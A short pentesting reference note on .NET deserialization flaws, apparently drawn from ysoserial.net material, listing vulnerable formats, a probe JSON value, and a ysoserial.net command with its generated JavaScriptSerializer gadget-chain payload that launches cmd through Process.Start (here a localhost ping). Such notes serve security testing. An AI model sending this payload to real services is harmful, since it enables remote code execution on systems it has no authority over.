# Deserialization: .NET

From:
- https://speakerdeck.com/pwntester/attacking-net-serialization
- https://github.com/pwntester/ysoserial.net

.NET Deserilization vulnerabilities can occur in
- Raw Binary
- XML
- JSON
- JavaScript
- SOAP

### JavaScript Deserializer

To test, send a JSON payload of
```
{"__type":""}

```
That should cause an error

Payload generated with ysoserial.net
```
.\ysoserial.exe -o raw -g ObjectDataProvider -f JavaScriptSerializer -c "ping 127.0.0.1"
	{
	    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
	    'MethodName':'Start',
	    'ObjectInstance':{
	        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
	        'StartInfo': {
	            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
	            'FileName':'cmd',
	            'Arguments':'/c ping 127.0.0.1'
	        }
	    }
	}
```